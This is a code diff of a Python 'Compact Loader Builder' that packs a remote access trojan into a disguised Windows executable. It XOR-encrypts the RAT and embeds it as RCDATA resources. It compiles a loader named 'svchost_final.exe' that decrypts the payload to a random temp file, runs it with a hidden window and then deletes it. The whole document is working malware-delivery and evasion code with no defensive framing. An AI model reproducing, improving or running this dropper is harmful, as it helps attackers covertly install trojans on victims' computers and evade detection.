@@ -1,5 +1,5 @@
 """
-Compact Loader Builder - Creates single EXE with embedded RAT
+Compact Loader Builder - Creates single EXE with binary resource
 """
 
 import os
@@ -9,7 +9,6 @@ import shutil
 import random
 import string
 import zlib
-import base64
 from pathlib import Path
 
 def generate_random_string(length=8):
@@ -42,12 +41,27 @@ def build_loader(original_exe_path):
     for i, byte in enumerate(compressed):
         encrypted.append(byte ^ key[i % len(key)])
     
-    data_b64 = base64.b64encode(encrypted).decode('ascii')
-    key_b64 = base64.b64encode(key).decode('ascii')
+    data_bin = os.path.join(output_dir, 'rat_data.bin')
+    with open(data_bin, 'wb') as f:
+        f.write(encrypted)
     
-    print("Creating loader EXE with embedded RAT...")
+    key_bin = os.path.join(output_dir, 'key.bin')
+    with open(key_bin, 'wb') as f:
+        f.write(key)
     
-    loader_code = f'''
+    print("Creating loader EXE with binary resource...")
+    
+    rc_content = '''
+#include <windows.h>
+IDR_RAT_DATA RCDATA "rat_data.bin"
+IDR_RAT_KEY RCDATA "key.bin"
+'''
+    
+    rc_file = os.path.join(output_dir, 'resource.rc')
+    with open(rc_file, 'w', encoding='utf-8') as f:
+        f.write(rc_content)
+    
+    loader_code = '''
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -55,43 +69,62 @@ def build_loader(original_exe_path):
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-static const unsigned char rat_data[] = "{data_b64}";
-static const unsigned char xor_key[] = "{key_b64}";
+#define IDR_RAT_DATA 101
+#define IDR_RAT_KEY 102
 
-void xor_decrypt(unsigned char* data, int len) {{
-    for(int i = 0; i < len; i++) {{
-        data[i] ^= xor_key[i % 32];
-    }}
-}}
+void xor_decrypt(unsigned char* data, int len, unsigned char* key, int key_len) {
+    for(int i = 0; i < len; i++) {
+        data[i] ^= key[i % key_len];
+    }
+}
 
-void run_rat() {{
+void run_rat() {
+    HMODULE hModule = GetModuleHandleA(NULL);
+    
+    HRSRC hResData = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_DATA), "RCDATA");
+    if (!hResData) return;
+    
+    HGLOBAL hData = LoadResource(hModule, hResData);
+    if (!hData) return;
+    
+    DWORD data_size = SizeofResource(hModule, hResData);
+    unsigned char* enc_data = (unsigned char*)LockResource(hData);
+    
+    HRSRC hResKey = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_KEY), "RCDATA");
+    if (!hResKey) return;
+    
+    HGLOBAL hKey = LoadResource(hModule, hResKey);
+    if (!hKey) return;
+    
+    DWORD key_size = SizeofResource(hModule, hResKey);
+    unsigned char* key_data = (unsigned char*)LockResource(hKey);
+    
+    unsigned char* decrypted = (unsigned char*)malloc(data_size);
+    if (!decrypted) return;
+    memcpy(decrypted, enc_data, data_size);
+    
+    xor_decrypt(decrypted, data_size, key_data, key_size);
+    
     char temp_path[MAX_PATH];
     char temp_file[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_path);
     
     const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
     char filename[13];
-    for(int i = 0; i < 12; i++) {{
+    for(int i = 0; i < 12; i++) {
         filename[i] = chars[rand() % 36];
-    }}
+    }
     filename[12] = '\\0';
     sprintf(temp_file, "%s%s.exe", temp_path, filename);
     
-    int data_len = strlen(rat_data);
-    unsigned char* decrypted = (unsigned char*)malloc(data_len);
-    if (!decrypted) return;
-    
-    memcpy(decrypted, rat_data, data_len);
-    xor_decrypt(decrypted, data_len);
-    
     HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile != INVALID_HANDLE_VALUE) {{
+    if (hFile != INVALID_HANDLE_VALUE) {
         DWORD written;
-        WriteFile(hFile, decrypted, data_len, &written, NULL);
+        WriteFile(hFile, decrypted, data_size, &written, NULL);
         CloseHandle(hFile);
         
-        STARTUPINFOA si = {{sizeof(si)}};
+        STARTUPINFOA si = {sizeof(si)};
         PROCESS_INFORMATION pi;
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
@@ -105,26 +138,37 @@ void run_rat() {{
         
         Sleep(5000);
         DeleteFileA(temp_file);
-    }}
+    }
+    
     free(decrypted);
-}}
+}
 
-int main() {{
+int main() {
     run_rat();
     return 0;
-}}
+}
 '''
     
     loader_src = os.path.join(output_dir, 'loader.c')
     with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
     
-    print("Compiling loader...")
+    print("Compiling loader with resources...")
     loader_exe = os.path.join(output_dir, 'svchost_final.exe')
+    
+    res_obj = os.path.join(output_dir, 'resource.o')
+    
+    cmd_res = ['windres', '-i', rc_file, '-o', res_obj]
+    try:
+        subprocess.run(cmd_res, check=True, capture_output=True)
+    except Exception as e:
+        print(f"Resource compilation failed: {e}")
+        return None
     
     cmd = [
         'gcc',
         loader_src,
+        res_obj,
         '-o', loader_exe,
         '-O3',
         '-s',
@@ -156,11 +200,13 @@ int main() {{
     print(f"Output: {loader_exe}")
     print(f"Original RAT: {original_size:.1f} MB")
     print(f"Final loader: {final_size:.2f} MB")
-    print(f"Compression: {final_size/original_size*100:.1f}%")
-    print(f"Saved: {original_size - final_size:.1f} MB")
     print("=" * 60)
     
     try:
+        os.remove(rc_file)
+        os.remove(res_obj)
+        os.remove(data_bin)
+        os.remove(key_bin)
         os.remove(loader_src)
     except:
         pass
